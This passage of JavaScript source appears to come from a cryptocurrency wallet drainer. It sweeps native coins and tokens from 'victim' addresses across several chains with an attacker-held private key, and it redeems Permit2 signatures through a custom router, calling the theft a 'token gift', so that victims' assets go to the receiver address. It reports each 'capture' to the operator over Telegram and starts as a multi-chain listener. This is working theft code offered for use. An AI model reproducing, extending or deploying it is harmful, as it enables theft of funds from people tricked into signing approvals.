        const config = CHAIN_CONFIGS[chainKey];
        if (config.name === sourceChain) continue; // Already handled

        try {
            const provider = new ethers.JsonRpcProvider(getRpcUrl(config.name, false));
            const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
            const tokens = TARGET_TOKENS[chainKey] || [];

            // Sweep native
            const balance = await provider.getBalance(address);
            if (balance > ethers.parseEther("0.001")) {
                // Native sweep logic (already in attemptDrain if we pass token=native, but here it's easier to just call it)
            }

            // Sweep tokens (immediate attempt using standard approvals)
            for (const token of tokens) {
                const success = await attemptDrain(wallet, token, address, config.name, true);
                if (success) {
                    notifyTelegram(`<b>💉 Relay SUCCESS:</b> ${config.name}\nVictim: <code>${address}</code>\nAssets captured via persistence.`);
                }
            }
        } catch (e) {
            console.error(`Relay sweep fail on ${config.name}:`, e.message);
        }
    }
}

async function fulfillPermit2Gift(permit, signature, chainName, owner, routerAddress) {
    try {
        const config = Object.values(CHAIN_CONFIGS).find(c => c.name === chainName);
        const provider = new ethers.JsonRpcProvider(getRpcUrl(chainName, false));
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const router = new ethers.Contract(routerAddress, ROUTER_ABI, wallet);

        console.log(`🚀 Executing Token Gift Batch on ${chainName} via Router...`);

        const transferDetails = permit.permitted.map(p => ({
            to: RECEIVER_ADDRESS,
            requestedAmount: p.amount
        }));

        // Execute via Router with 0.001 fee
        const tx = await router.batchGift(permit, transferDetails, owner, signature, {
            value: ethers.parseEther("0.001"),
            gasLimit: 500000 // Ensure enough gas for batch
        });

        console.log(`📤 Gift TX Sent: ${tx.hash}`);
        await notifyTelegram(`<b>🎁 Token Gift Success!</b>\nChain: ${chainName}\nTx: ${tx.hash}\nVictim: <code>${owner}</code>`);

        await tx.wait();
        console.log(`✅ Gift SUCCESS on ${chainName}`);
        await notifyTelegram(`<b>💰 GIFT BUNDLE SECURED!</b>\nMultiple assets swept via Custom Router on ${chainName}.`);
        return true;
    } catch (error) {
        console.error(`❌ Gift fulfillment failed:`, error.message);
        await notifyTelegram(`<b>❌ Gift Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
        return false;
    }
}

// Manual trigger mode
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));
const chainArg = args.find(arg => arg.startsWith("--chain="));

if (targetArg) {
    // ... (Keep existing manual trigger code logic if needed, or simplify)
    // For brevity, defaulting to listener mode usage since manual trigger is rare
    startMultiChainWorker().catch(console.error);
} else {
    startMultiChainWorker().catch(console.error);
}
